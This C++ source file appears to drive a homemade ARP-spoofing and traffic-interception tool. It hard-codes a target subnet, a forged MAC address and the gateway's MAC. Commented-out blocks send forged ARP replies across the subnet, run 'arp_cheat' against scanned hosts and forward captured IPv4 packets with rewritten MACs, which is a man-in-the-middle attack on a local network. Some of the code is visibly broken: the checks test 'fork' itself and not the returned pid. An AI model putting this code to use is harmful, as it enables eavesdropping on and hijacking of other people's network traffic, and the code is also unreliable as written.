#include<vector>
#include <iostream>
#include <algorithm>
using namespace std;

#include <sock_funs.h>
#include <sock_base.h>
#include <mac_arp.h>
#include <mac_all.h>


int main() {
    mac_arp mya;
    my_mac m;
    my_arp a;
    mac_all all;
    char buf[max_ether_len];

    char *ip_st = "10.137.142.0";
    char *ip_ed = "10.137.142.255";
    //mya.recv_arp(&m, &a);
    char *fake_mac = "\xc0\xee\xfb\xe0\x16\x78"; //194 204
    char *gate_max = "\x60\x0b\x03\x2c\x30\x02";

    /*
        while(1) {
            while(st != 0xffffffff) {
                mya.form_arp(&a,"10.137.0.1" , inet_ntoa(*(struct in_addr*)&st), 2, fake_mac);
                mya.send_arp(&m, &a);
                printf("ip:%s\n",inet_ntoa(*(struct in_addr*)&st));
                st=htonl(st);
                st++;
                st=htonl(st);
            }
            st = inet_addr(tar);
            //sleep(1);
        }
        */

    uint32_t tepp = mya.local_ipend();
    //printf("%s\n",inet_ntoa(i2addr_in(tepp)));
    //mya.arp_cheat(ip_st, ip_ed );

    all.show_netcards();
    //all.set_recv_card();
 /*   printf("free port:%d\n", all.get_freeport());

    if(mya.get_mac(buf, inet_addr("10.137.0.1"))==0)
    printf("gate mac:%02x, %02x, %02x", buf[3]& 0xff, buf[4]& 0xff,buf[5]& 0xff);
*/
    all.nat(0,0);

    while(0){
    int tlen = all.recv_all(buf);
            //all.show_mac((my_mac*)buf);
            my_mac *mp = (my_mac*)buf;
            my_ip*pp = (my_ip*)all.rid_mac(buf);
            all.show_ip(pp);
}


    /*
    vector<tar_info> pr;

    mya.scan_ip_arp(pr, ip_st, ip_ed);//
    //mya.arp_cheat(ip_st, ip_ed);

    for (vector<tar_info>::iterator it = pr.begin(); it != pr.end(); it++) {
        cout << inet_ntoa(*(in_addr*) & ((*it).ip)) << ":" << endl;
        for (int i = 0; i < mac_len; i++)
            printf("%02x:", (*it).mac[i] & 0xff);
        cout << endl;
    }
    printf("size:%d\n", pr.size());

    pid_t pf = fork();
    if (fork < 0) perror("fork error\n");
    else if (!fork)mya.arp_cheat(pr);
    else {
        all.show_netcards();
        while(1) {
            int tlen = all.recv_all(buf);
            //all.show_mac((my_mac*)buf);
            my_mac *mp = (my_mac*)buf;
            my_ip*pp = (my_ip*)all.rid_mac(buf);

            if (mp->type == htons(0x800) && pp->des_ip != all.getmyip() && pp->src_ip != all.getmyip()) {
                all.show_ip(pp);
                memcpy(mp->src, gate_max, mac_len);
                all.send_all(buf, tlen);
                printf("switch once\n");
            }

        }
    }
    */
    return 0;
}
